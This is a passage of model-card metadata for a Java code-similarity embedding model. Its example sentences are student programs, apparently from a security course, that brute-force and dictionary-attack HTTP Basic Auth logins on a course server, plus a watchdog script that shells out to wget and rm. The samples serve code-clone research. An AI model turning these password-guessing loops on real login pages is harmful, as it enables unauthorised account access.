+      \    while (i < bytes.length) {\n       byte b1 = bytes [i++];\n       byte b2;\n       byte b3;\n       if (i >= bytes.length)\
+      \ {\n          b2 = 0;\n          b3 = 0;\n          pad = 2;\n          }\n       else {\n          b2 = bytes [i++];\n\
+      \          if (i >= bytes.length) {\n             b3 = 0;\n             pad = 1;\n             }\n          else\n \
+      \            b3 = bytes [i++];\n          }\n       byte c1 = (byte)(b1 >> 2);\n       byte c2 = (byte)(((b1 & 0x3)\
+      \ << 4) | (b2 >> 4));\n       byte c3 = (byte)(((b2 & 0xf) << 2) | (b3 >> 6));\n       byte c4 = (byte)(b3 & 0x3f);\n\
+      \       encodedString += base64Array [c1];\n       encodedString += base64Array [c2];\n       switch (pad) {\n     \
+      \   case 0:\n          encodedString += base64Array [c3];\n          encodedString += base64Array [c4];\n          break;\n\
+      \        case 1:\n          encodedString += base64Array [c3];\n          encodedString += \"=\";\n          break;\n\
+      \        case 2:\n          encodedString += \"==\";\n          break;\n        }\n       }\n       return encodedString;\n\
+      \   }\n }\n\n"
+    sentences:
+    - "import java.net.*;\nimport java.io.*;\nimport java.*;\n\n public class BruteForce {\n\n   URLConnection conn = null;\n\
+      \   private static boolean status = false;\n\n   public static void main (String args[]){\n     BruteForce a = new BruteForce();\n\
+      \     String[] inp = {\"http://sec-crack.cs.rmit.edu./SEC/2/index.php\",\n     \t\t\t\t \"\",\n     \t\t\t\t \"\"};\n\
+      \     int attempts = 0;\n     exit:\n     for (int i=0;i<pwdArray.length;i++) {\n\t\t for (int j=0;j<pwdArray.length;j++)\
+      \ {\n\t\t\t for (int k=0;k<pwdArray.length;k++) {\n\t\t\t\t if (pwdArray[i] == ' ' && pwdArray[j] != ' ') continue;\n\
+      \t\t\t\t if (pwdArray[j] == ' ' && pwdArray[k] != ' ') continue;\n\t\t\t\t inp[2] = inp[2] + pwdArray[i] + pwdArray[j]\
+      \ + pwdArray[k];\n\t\t\t\t attempts++;\n     \t\t\t a.doit(inp);\n  \n  \t\t\t\t if (status) {\n\t\t\t\t\t System.out.println(\"\
+      Crrect password is: \" + inp[2]);\n\t\t\t\t\t System.out.println(\"Number of attempts = \" + attempts);\n\t\t\t\t\t\
+      \ break exit;\n\t\t\t \t }\n     \t\t\t inp[2] = \"\";\n\t\t \t }\n\t \t }\n      }\n     }\n\n   public void doit(String\
+      \ args[]) {\n     \n     try {\n       BufferedReader in = new BufferedReader(\n           new InputStreamReader\n \
+      \             (connectURL(new URL(args[0]), args[1], args[2])));\n       String line;\n       while ((line = in.readLine())\
+      \ != null) {\n           System.out.println(line);\n           status = true;\n           }\n       }\n     catch (IOException\
+      \ e) {\n   \n       }\n     }\n\n   public InputStream connectURL (URL url, String uname, String pword)\n        throws\
+      \ IOException  {\n     conn = url.openConnection();\n     conn.setRequestProperty (\"Authorization\",\n     userNamePasswordBase64(uname,pword));\n\
+      \     conn.connect ();\n     return conn.getInputStream();\n     }\n\n   public String userNamePasswordBase64(String\
+      \ username, String password) {\n     return \" \" + base64Encode (username + \":\" + password);\n     }\n\n   private\
+      \ final static char pwdArray [] = {\n\t        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h',\n\t        'i', 'j', 'k', 'l',\
+      \ 'm', 'n', 'o', 'p',\n\t        'q', 'r', 's', 't', 'u', 'v', 'w', 'x',\n\t        'y', 'z', 'A', 'B', 'C', 'D', 'E',\
+      \ 'F',\n\t        'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N',\n\t        'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',\n\t   \
+      \     'W', 'X', 'Y', 'Z', ' '\n  };\n\n   private final static char base64Array [] = {\n       'A', 'B', 'C', 'D', 'E',\
+      \ 'F', 'G', 'H',\n       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',\n       'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n \
+      \      'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n       'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\n       'o', 'p', 'q',\
+      \ 'r', 's', 't', 'u', 'v',\n       'w', 'x', 'y', 'z', '0', '1', '2', '3',\n       '4', '5', '6', '7', '8', '9', '+',\
+      \ '/'\n  };\n\n   private static String base64Encode (String string)    {\n     String encodedString = \"\";\n     byte\
+      \ bytes [] = string.getBytes ();\n     int i = 0;\n     int pad = 0;\n     while (i < bytes.length) {\n       byte b1\
+      \ = bytes [i++];\n       byte b2;\n       byte b3;\n       if (i >= bytes.length) {\n          b2 = 0;\n          b3\
+      \ = 0;\n          pad = 2;\n          }\n       else {\n          b2 = bytes [i++];\n          if (i >= bytes.length)\
+      \ {\n             b3 = 0;\n             pad = 1;\n             }\n          else\n             b3 = bytes [i++];\n \
+      \         }\n       byte c1 = (byte)(b1 >> 2);\n       byte c2 = (byte)(((b1 & 0x3) << 4) | (b2 >> 4));\n       byte\
+      \ c3 = (byte)(((b2 & 0xf) << 2) | (b3 >> 6));\n       byte c4 = (byte)(b3 & 0x3f);\n       encodedString += base64Array\
+      \ [c1];\n       encodedString += base64Array [c2];\n       switch (pad) {\n        case 0:\n          encodedString\
+      \ += base64Array [c3];\n          encodedString += base64Array [c4];\n          break;\n         case 1:\n         \
+      \ encodedString += base64Array [c3];\n          encodedString += \"=\";\n          break;\n        case 2:\n       \
+      \   encodedString += \"==\";\n          break;\n        }\n       }\n       return encodedString;\n   }\n }\n\n"
+    - "\n\n\n\n\n\nimport java.util.*;\nimport java.io.*;\nimport java.net.*;\n\npublic class MyWatchDogTimer extends TimerTask\n\
+      {\n\tpublic void run()\n\t{\n\t  Runtime rt = Runtime.getRuntime();\n\t  Process prss= null;\n\t  String initialmd5,presentmd5,finalmd5,temp1;\n\
+      \          String mesg1 = new String();\n          String subject = new String(\"Report of WatchDog\");\n\n\t  int i;\n\
+      \          \n\t  try\n          {\n\n              prss = rt.exec(\"md5sum first.html\");\n\n              InputStreamReader\
+      \ instre1 = new InputStreamReader(prss.getInputStream());\n              BufferedReader bufread1 = new BufferedReader(instre1);\n\
+      \t\t    \n             sw  = bufread1.readLine();\n\t      i = finalmd5.indexOf(' ');\n\t      initialmd5 = finalmd5.substring(0,i);\n\
+      \t      System.out.println(\"this is of first.html--->\"+initialmd5);\n\t\t    \n\n\t\t    \n              prss = rt.exec(\"\
+      wget -R mpg,mpeg, --output-document=present.html http://www.cs.rmit.edu./students/\");\n\n\t\t    \n              prss\
+      \ = rt.exec(\"md5sum present.html\");\n\t\t    \n              InputStreamReader instre2 = new InputStreamReader(prss.getInputStream());\n\
+      \              BufferedReader bufread2 = new BufferedReader(instre2);\n\t\t    \n\t      temp1 = bufread2.readLine();\n\
+      \t      i = temp1.indexOf(' ');\n\t      presentmd5 = temp1.substring(0,i);\n\t      System.out.println(\"this is of\
+      \ present.html---->\"+presentmd5);\n\t\t\n    \n                 if(initialmd5.equals(presentmd5))\n               \
+      \      System.out.println(\"The checksum found using md5sum is same\");\n\t\t else\n\t\t    {\n\t\t      prss = rt.exec(\"\
+      diff first.html present.html > diff.html\");\n                      System.out.println(\" is different\"); \n      \
+      \                prss = null;\n                  mesg1 =\"php mail.php\";\n\t\t      prss = rt.exec(mesg1);\n\t\t  \
+      \  }   \n\n                   prss = rt.exec(\"rm present.*\");\n\n    \t     }catch(java.io.IOException e){}\n\n  \
+      \      }\n}\t\t\n"
+    - "import java.net.*;\nimport java.io.*;\n\n public class Dictionary {\n int attempts = 0;\n   URLConnection conn = null;\n\
+      \n   public static void main (String args[]){\n\n\tDictionary a = new Dictionary();\n     a.attack(args);\n     }\n\n\
+      \   public void attack(String args[]) {\n   try {\n       String login = new String(\"\");\n       String url = new\
+      \ String(\"http://sec-crack.cs.rmit.edu./SEC/2/index.php\");\n       String passwd = new String();\n\n\n       passwd\
+      \ = getPasswd();\n       BufferedReader in = new BufferedReader( new InputStreamReader (openURLForInput(new URL(url),\
+      \ login , passwd)));\n\n       String line;\n       while ((line = in.readLine()) != null) {\n           System.out.println(line);\n\
+      \           }\n           System.out.println(\"Password Cracked Successfully!!!\");\n           System.out.println(\"\
+      The passsword is :\" + passwd + \"and got after \" +attempts + \" tries\");\n       }\n     catch (IOException e) {\n\
+      \  \n      String r = new String(e.getMessage());\n    if ( r != null)\n    {\n     System.out.println(\"Message :\"\
+      \ +r);\n     Dictionary a = new Dictionary();\n     a.attack(args);\n    }\n     else\n     {\n\tSystem.out.println(\"\
+      Trying again\");\n\tDictionary a = new Dictionary();\n\ta.attack(args);\n     }\n     }\n   }\n  public String getPasswd()\n\
+      \  {\n\n int i=0;int j=0;\n attempts++;\n int count =0;\n System.out.println(\"Passing dictionary word and waiting for\
+      \ URL reply....... \");\n  String currentword = \"\";\n  String se = \"\";\n  try{\n FileInputStream reader = new FileInputStream\
+      \ (\"words\");\n DataInputStream in = new DataInputStream(reader);\n while (in.available() !=0)\n{\n currentword = in.readLine();\n\
+      \ count++;\n \n \n }\n }\n  catch( IOException e){}\n\n  return currentword;\n\t \n         }\n\n\n\n public InputStream\
+      \ openURLForInput (URL url, String uname, String pword)\n throws IOException  {\n     conn = url.openConnection();\n\
+      \     conn.setDoInput (true);\n     conn.setRequestProperty (\"Authorization\", userNamePasswordBase64(uname,pword));\n\
+      \     conn.connect ();\n     return conn.getInputStream();\n     }\n\n\n public String userNamePasswordBase64(String\
+      \ username, String password) {\n     return \" \" + base64Encode (username + \":\" + password);\n     }\n\n private\
+      \ final static char base64Array [] = {\n       'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',\n       'I', 'J', 'K', 'L', 'M',\
+      \ 'N', 'O', 'P',\n       'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n       'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n \
+      \      'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\n       'o', 'p', 'q', 'r', 's', 't', 'u', 'v',\n       'w', 'x', 'y',\
+      \ 'z', '0', '1', '2', '3',\n       '4', '5', '6', '7', '8', '9', '+', '/'\n  };\n\n private static String base64Encode\
+      \ (String string)    {\n     String encodedString = \"\";\n     byte bytes [] = string.getBytes ();\n     int i = 0;\n\
+      \     int pad = 0;\n     while (i < bytes.length) {\n       byte b1 = bytes [i++];\n       byte b2;\n       byte b3;\n\
+      \       if (i >= bytes.length) {\n          b2 = 0;\n          b3 = 0;\n          pad = 2;\n          }\n       else\
+      \ {\n          b2 = bytes [i++];\n          if (i >= bytes.length) {\n             b3 = 0;\n             pad = 1;\n\
+      \             }\n          else\n             b3 = bytes [i++];\n          }\n       byte c1 = (byte)(b1 >> 2);\n  \
+      \     byte c2 = (byte)(((b1 & 0x3) << 4) | (b2 >> 4));\n       byte c3 = (byte)(((b2 & 0xf) << 2) | (b3 >> 6));\n  \
+      \     byte c4 = (byte)(b3 & 0x3f);\n       encodedString += base64Array [c1];\n       encodedString += base64Array [c2];\n\
+      \       switch (pad) {\n         case 0:\n          encodedString += base64Array [c3];\n          encodedString += base64Array\
+      \ [c4];\n          break;\n         case 1:\n          encodedString += base64Array [c3];\n          encodedString +=\
+      \ \"=\";\n          break;\n         case 2:\n          encodedString += \"==\";\n          break;\n        }\n    \
+      \   }\n       return encodedString;\n   }\n }\n\n"
+  - source_sentence: "import java.net.*;\nimport java.io.*;\nimport java.*;\n\n public class Dictionary {\n\n   URLConnection\
+      \ conn = null;\n   private static boolean status = false;\n\n   public static void main (String args[]){\n     Dictionary\
+      \ a = new Dictionary();\n     String[] inp = {\"http://sec-crack.cs.rmit.edu./SEC/2/index.php\",\n     \t\t\t\t \"\"\
+      ,\n     \t\t\t\t \"\"};\n     File file = new File(\"words\");\n     exit:\n     try {\n\t\t BufferedReader in = new\
+      \ BufferedReader(new FileReader(file));\n\t\t int attempt = 0;\n\t\t inp[2] = in.readLine();\n\t\t while (inp[2] !=\
+      \ null) {\n\t\n\t\t\t if (inp[2].length() <= 3) {\n\t\t\t \tattempt++;\n\t\t\t \ta.doit(inp);\n     \t\t \tif (status)\
+      \ {\n\t\t\t \t\t System.out.println(\"Crrect password is: \" + inp[2]);\n\t\t\t \t\t System.out.println(\"Number of\
+      \ attempts = \" + attempt);\n\t\t\t \t\t break exit;\n\t\t\t \t}\n\t\t \t }\n\t\t\t inp[2] = in.readLine();\n   \t\t\
+      }\n\t } catch (FileNotFoundException e1) {\n\t\t \n\t\tSystem.err.println(\"File not found: \" + file);\n\t} catch (IOException\
+      \ e2) {\n\t\t\n\t\te2.printStackTrace();\n\t}\n\n   }\n\n   public void doit(String args[]) {\n     \n     try {\n \
+      \      BufferedReader in = new BufferedReader(\n           new InputStreamReader\n              (connectURL(new URL(args[0]),\
+      \ args[1], args[2])));\n       String line;\n       while ((line = in.readLine()) != null) {\n           System.out.println(line);\n\
+      \           status = true;\n           }\n       }\n     catch (IOException e) {\n   \n       }\n     }\n\n   public\
+      \ InputStream connectURL (URL url, String uname, String pword)\n        throws IOException  {\n     conn = url.openConnection();\n\
+      \     conn.setRequestProperty (\"Authorization\",\n     userNamePasswordBase64(uname,pword));\n     conn.connect ();\n\
+      \     return conn.getInputStream();\n     }\n\n   public String userNamePasswordBase64(String username, String password)\
+      \ {\n     return \" \" + base64Encode (username + \":\" + password);\n     }\n\n   private final static char base64Array\
+      \ [] = {\n       'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',\n       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',\n       'Q',\
+      \ 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n       'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n       'g', 'h', 'i', 'j', 'k',\
+      \ 'l', 'm', 'n',\n       'o', 'p', 'q', 'r', 's', 't', 'u', 'v',\n       'w', 'x', 'y', 'z', '0', '1', '2', '3',\n \
+      \      '4', '5', '6', '7', '8', '9', '+', '/'\n  };\n\n   private static String base64Encode (String string)    {\n\
+      \     String encodedString = \"\";\n     byte bytes [] = string.getBytes ();\n     int i = 0;\n     int pad = 0;\n \
+      \    while (i < bytes.length) {\n       byte b1 = bytes [i++];\n       byte b2;\n       byte b3;\n       if (i >= bytes.length)\
+      \ {\n          b2 = 0;\n          b3 = 0;\n          pad = 2;\n          }\n       else {\n          b2 = bytes [i++];\n\
+      \          if (i >= bytes.length) {\n             b3 = 0;\n             pad = 1;\n             }\n          else\n \
+      \            b3 = bytes [i++];\n          }\n       byte c1 = (byte)(b1 >> 2);\n       byte c2 = (byte)(((b1 & 0x3)\
+      \ << 4) | (b2 >> 4));\n       byte c3 = (byte)(((b2 & 0xf) << 2) | (b3 >> 6));\n       byte c4 = (byte)(b3 & 0x3f);\n\
+      \       encodedString += base64Array [c1];\n       encodedString += base64Array [c2];\n       switch (pad) {\n     \
+      \   case 0:\n          encodedString += base64Array [c3];\n          encodedString += base64Array [c4];\n          break;\n\
+      \        case 1:\n          encodedString += base64Array [c3];\n          encodedString += \"=\";\n          break;\n\
+      \        case 2:\n          encodedString += \"==\";\n          break;\n        }\n       }\n       return encodedString;\n\
+      \   }\n }\n\n"
+    sentences:
+    - "package java.httputils;\n\nimport java.io.BufferedReader;\nimport java.io.FileNotFoundException;\nimport java.io.FileReader;\n\
+      import java.io.IOException;\nimport java.net.MalformedURLException;\nimport java.sql.Timestamp;\n\n\npublic class Dictionary\
+      \ extends BruteForce\n{\n    protected String wordFile;\n\n    public Dictionary()\n    {\n        super();\n    }\n\
+      \n    public static void main(String[] args)\n    {\n        Dictionary dictionary = new Dictionary();\n\n        if\
+      \ (args.length < 3)\n        {\n            System.out.println(dictionary.printUsage());\n        }\n        else\n\
+      \        {\n            dictionary.setURL(args[0]);\n            dictionary.setUserName(args[1]);\n            dictionary.setWordFile(args[2]);\n\
+      \n            if (args.length > 3)\n            {\n                dictionary.setFileName(args[3]);\n            }\n\
+      \            dictionary.process();\n            System.out.println(dictionary.printResult());\n            System.exit(1);\n\
+      \        }\n    }\n\n    public void process()\n    {\n        attempts = 0;\n        String password = \"\";\n    \
+      \    \n        setStart(new Timestamp(System.currentTimeMillis()));\n\n        BufferedReader input = null;\n      \
+      \  try\n        {\n            FileReader file = new FileReader(getWordFile());\n            \n            input = new\
+      \ BufferedReader(file);\n            \n        }\n        catch (FileNotFoundException x)\n        {\n            System.err.println(\"\
+      File not found: \" + getWordFile());\n            System.exit(2);\n        }\n\n        try\n        {\n           \
+      \ while ((password = input.readLine()) != null)\n            {\n                try\n                {\n           \
+      \         \n                    attempts++;\n                    BasicAuthHttpRequest req =\n                      \
+      \  new BasicAuthHttpRequest(\n                            getURL(),\n                            getUserName(),\n  \
+      \                          password);\n                    setPassword(password);\n                    setEnd(new Timestamp(System.currentTimeMillis()));\n\
+      \                    setContent(req.getContent().toString());\n\n                    \n                    if (getFileName()\
+      \ != null\n                        && getFileName().length() > 0)\n                    {\n                        createReport();\n\
+      \                    }\n                    return;\n                }\n                catch (MalformedURLException\
+      \ e)\n                {\n                    e.printStackTrace();\n                    return;\n                }\n\
+      \                catch (IOException e)\n                {\n\n                }\n            }\n        }\n        catch\
+      \ (IOException x)\n        {\n            x.printStackTrace();\n        }\n\n        \n        setEnd(new Timestamp(System.currentTimeMillis()));\n\
+      \n    }\n\n    public String printUsage()\n    {\n        StringBuffer s = new StringBuffer();\n\n        s.append(\"\
+      ** BruteForce proper usage **\\n\\n\");\n        s.append(\n            \"java ..httputils.Dictionary <URL> <UserName>\
+      \ <Word File> <OutputFile - Optional>\\n\\n\");\n\n        return s.toString();\n    }\n    \n    public String getWordFile()\n\
+      \    {\n        return wordFile;\n    }\n\n    \n    public void setWordFile(String string)\n    {\n        wordFile\
+      \ = string;\n    }\n\n}\n"
+    - "import java.net.*;\nimport java.io.*;\n\n public class Dictionary {\n int attempts = 0;\n   URLConnection conn = null;\n\
+      \n   public static void main (String args[]){\n\n\tDictionary a = new Dictionary();\n     a.attack(args);\n     }\n\n\
+      \   public void attack(String args[]) {\n   try {\n       String login = new String(\"\");\n       String url = new\
+      \ String(\"http://sec-crack.cs.rmit.edu./SEC/2/index.php\");\n       String passwd = new String();\n\n\n       passwd\
+      \ = getPasswd();\n       BufferedReader in = new BufferedReader( new InputStreamReader (openURLForInput(new URL(url),\
+      \ login , passwd)));\n\n       String line;\n       while ((line = in.readLine()) != null) {\n           System.out.println(line);\n\
+      \           }\n           System.out.println(\"Password Cracked Successfully!!!\");\n           System.out.println(\"\
+      The passsword is :\" + passwd + \"and got after \" +attempts + \" tries\");\n       }\n     catch (IOException e) {\n\
+      \  \n      String r = new String(e.getMessage());\n    if ( r != null)\n    {\n     System.out.println(\"Message :\"\
+      \ +r);\n     Dictionary a = new Dictionary();\n     a.attack(args);\n    }\n     else\n     {\n\tSystem.out.println(\"\
+      Trying again\");\n\tDictionary a = new Dictionary();\n\ta.attack(args);\n     }\n     }\n   }\n  public String getPasswd()\n\
+      \  {\n\n int i=0;int j=0;\n attempts++;\n int count =0;\n System.out.println(\"Passing dictionary word and waiting for\
+      \ URL reply....... \");\n  String currentword = \"\";\n  String se = \"\";\n  try{\n FileInputStream reader = new FileInputStream\
+      \ (\"words\");\n DataInputStream in = new DataInputStream(reader);\n while (in.available() !=0)\n{\n currentword = in.readLine();\n\
+      \ count++;\n \n \n }\n }\n  catch( IOException e){}\n\n  return currentword;\n\t \n         }\n\n\n\n public InputStream\
+      \ openURLForInput (URL url, String uname, String pword)\n throws IOException  {\n     conn = url.openConnection();\n\
+      \     conn.setDoInput (true);\n     conn.setRequestProperty (\"Authorization\", userNamePasswordBase64(uname,pword));\n\
+      \     conn.connect ();\n     return conn.getInputStream();\n     }\n\n\n public String userNamePasswordBase64(String\
+      \ username, String password) {\n     return \" \" + base64Encode (username + \":\" + password);\n     }\n\n private\
+      \ final static char base64Array [] = {\n       'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',\n       'I', 'J', 'K', 'L', 'M',\
+      \ 'N', 'O', 'P',\n       'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n       'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n \
+      \      'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\n       'o', 'p', 'q', 'r', 's', 't', 'u', 'v',\n       'w', 'x', 'y',\
+      \ 'z', '0', '1', '2', '3',\n       '4', '5', '6', '7', '8', '9', '+', '/'\n  };\n\n private static String base64Encode\
+      \ (String string)    {\n     String encodedString = \"\";\n     byte bytes [] = string.getBytes ();\n     int i = 0;\n\
+      \     int pad = 0;\n     while (i < bytes.length) {\n       byte b1 = bytes [i++];\n       byte b2;\n       byte b3;\n\
+      \       if (i >= bytes.length) {\n          b2 = 0;\n          b3 = 0;\n          pad = 2;\n          }\n       else\
+      \ {\n          b2 = bytes [i++];\n          if (i >= bytes.length) {\n             b3 = 0;\n             pad = 1;\n\
+      \             }\n          else\n             b3 = bytes [i++];\n          }\n       byte c1 = (byte)(b1 >> 2);\n  \
+      \     byte c2 = (byte)(((b1 & 0x3) << 4) | (b2 >> 4));\n       byte c3 = (byte)(((b2 & 0xf) << 2) | (b3 >> 6));\n  \
+      \     byte c4 = (byte)(b3 & 0x3f);\n       encodedString += base64Array [c1];\n       encodedString += base64Array [c2];\n\
+      \       switch (pad) {\n         case 0:\n          encodedString += base64Array [c3];\n          encodedString += base64Array\
+      \ [c4];\n          break;\n         case 1:\n          encodedString += base64Array [c3];\n          encodedString +=\
+      \ \"=\";\n          break;\n         case 2:\n          encodedString += \"==\";\n          break;\n        }\n    \
+      \   }\n       return encodedString;\n   }\n }\n\n"
+    - "import java.net.*;\nimport java.io.*;\n\n public class Bruteforce {\n int attempts = 0;\n  int l = 65;int m = 65;int\
+      \ n = 65;\n   URLConnection conn = null;\n\n   public static void  main(String args[]){\n     \n\tBruteforce a = new\
+      \ Bruteforce();\n        a.attack(args);\n     }\n\n   public void attack(String args[]) {\n   try {\n\n       String\
+      \ login = new String(\"\");\n       String url = new String(\"http://sec-crack.cs.rmit.edu./SEC/2/index.php\");\n  \
+      \     String passwd = new String();\n\n\t passwd = getPasswd();\n         BufferedReader in = new BufferedReader( new\
+      \ InputStreamReader (openURLForInput(new URL(url), login , passwd)));\n\n       String line;\n       while ((line =\
+      \ in.readLine()) != null) {\n           System.out.println(line);\n           }\n           System.out.println(\"Password\
+      \ Cracked Successfully!!!\");\n           System.out.println(\"The passsword is :\" + passwd + \"and got after \" +\
+      \ attempts + \" tries\");\n       }\n     catch (IOException e) {\n    \n      String r = new String(e.getMessage());\n\
+      \    if ( r != null)\n    {\n     System.out.println(\"Message :\" +r);\n     System.out.println(\"Trying again with\
+      \ new password\");\n     Bruteforce a = new Bruteforce();\n     a.attack(args);\n    }\n     else\n     {\n\tSystem.out.println(\"\
+      Trying again with new password\");\n\tBruteforce a = new Bruteforce();\n\ta.attack(args);\n     }\n     }\n   }\n  public\
+      \ String getPasswd()\n  {\n    attempts++;\n\n    char i1 = 0;\n    char j1 = 0;\n    char k1 = 0;\n    \n     int i=\
+      \ l;     int j= m;     int k= n;\n\n    String c = new String();\n    String c1 = new String();\n    String c2 = new\
+      \ String();\n    String c3 = new String();\n    String c4 = new String();\n    boolean flag;\n\n    for (i=l;i<123;i++)\n\
+      \    for (j=m;j<123;j++)\n    for (k=n;k<123;k++)\n    {\n        if( flag = true )\n        {\n\n    i1 = (char)i;\n\
+      \    j1 = (char)j;\n    k1 = (char)k;\n\n    if (i==91) i=97;\n    if (j==91) j=97;\n    if (k==91) k=97;\n\n    c =\
+      \ i1+\"\";\n    c1 = j1+\"\";\n    c2 = k1+\"\";\n    c3 = c.concat(c1);\n    c4 = c3.concat(c2);\n    }else break;\n\
+      \    }\n    flag = false;\n    return c4;\n  }\n\n public InputStream openURLForInput (URL url, String uname, String\
+      \ pword)\n throws IOException  {\n     conn = url.openConnection();\n     conn.setDoInput (true);\n     conn.setRequestProperty\
+      \ (\"Authorization\", PasswordBase64(uname,pword));\n     conn.connect ();\n     return conn.getInputStream();\n   \
+      \  }\n\n\n public String PasswordBase64(String username, String password) {\n     return \" \" + base64Encode (username\
+      \ + \":\" + password);\n     }\n\n private final static char base64Array [] = {\n       'A', 'B', 'C', 'D', 'E', 'F',\
+      \ 'G', 'H',\n       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',\n       'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n      \
+      \ 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n       'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\n       'o', 'p', 'q', 'r',\
+      \ 's', 't', 'u', 'v',\n       'w', 'x', 'y', 'z', '0', '1', '2', '3',\n       '4', '5', '6', '7', '8', '9', '+', '/'\n\
+      \  };\n\n private static String base64Encode (String string)    {\n     String encodedString = \"\";\n     byte bytes\
+      \ [] = string.getBytes ();\n     int i = 0;\n     int pad = 0;\n     while (i < bytes.length) {\n       byte b1 = bytes\
+      \ [i++];\n       byte b2;\n       byte b3;\n       if (i >= bytes.length) {\n          b2 = 0;\n          b3 = 0;\n\
+      \          pad = 2;\n          }\n       else {\n          b2 = bytes [i++];\n          if (i >= bytes.length) {\n \
+      \            b3 = 0;\n             pad = 1;\n             }\n          else\n             b3 = bytes [i++];\n      \
+      \    }\n       byte c1 = (byte)(b1 >> 2);\n       byte c2 = (byte)(((b1 & 0x3) << 4) | (b2 >> 4));\n       byte c3 =\
+      \ (byte)(((b2 & 0xf) << 2) | (b3 >> 6));\n       byte c4 = (byte)(b3 & 0x3f);\n       encodedString += base64Array [c1];\n\
+      \       encodedString += base64Array [c2];\n       switch (pad) {\n         case 0:\n          encodedString += base64Array\
+      \ [c3];\n          encodedString += base64Array [c4];\n          break;\n         case 1:\n          encodedString +=\
+      \ base64Array [c3];\n          encodedString += \"=\";\n          break;\n        case  2:\n          encodedString\
+      \ += \"==\";\n          break;\n        }\n       }\n       return encodedString;\n   }\n }\n"
+  datasets:
+  - buelfhood/SOCO_TRAIN_java
+  pipeline_tag: sentence-similarity
+  library_name: sentence-transformers
+siblings:
+- rfilename: .gitattributes
+- rfilename: 1_Pooling/config.json
+- rfilename: README.md
+- rfilename: config.json
+- rfilename: config_sentence_transformers.json
+- rfilename: merges.txt
+- rfilename: model.safetensors
+- rfilename: modules.json
+- rfilename: sentence_bert_config.json
+- rfilename: special_tokens_map.json
+- rfilename: tokenizer.json
+- rfilename: tokenizer_config.json
+- rfilename: vocab.json
+spaces: []
+createdAt: '2025-06-10T16:05:33.000Z'
+safetensors:
+  parameters:
+    F32: 83450880
+  total: 83450880
+usedStorage: 333815048
+downloadsAllTime: 57
+inferenceProviderMapping: {}
+configJson:
+  architectures:
+  - RobertaModel
+  attention_probs_dropout_prob: 0.1
+  bos_token_id: 0
+  classifier_dropout: null
+  eos_token_id: 2
+  hidden_act: gelu
+  hidden_dropout_prob: 0.1
+  hidden_size: 768
+  initializer_range: 0.02
+  intermediate_size: 3072
+  layer_norm_eps: 1.0e-05
+  max_position_embeddings: 514
+  model_type: roberta
+  num_attention_heads: 12
+  num_hidden_layers: 6
+  pad_token_id: 1
+  position_embedding_type: absolute
+  torch_dtype: float32
+  transformers_version: 4.52.4
+  type_vocab_size: 1
+  use_cache: true
+  vocab_size: 52000
+onnxFiles: {}
+safetensorsSizeMb: 333.8
+approxSizeMb: 333.8
+fetchedAt: '2026-06-09T06:55:53.000Z'
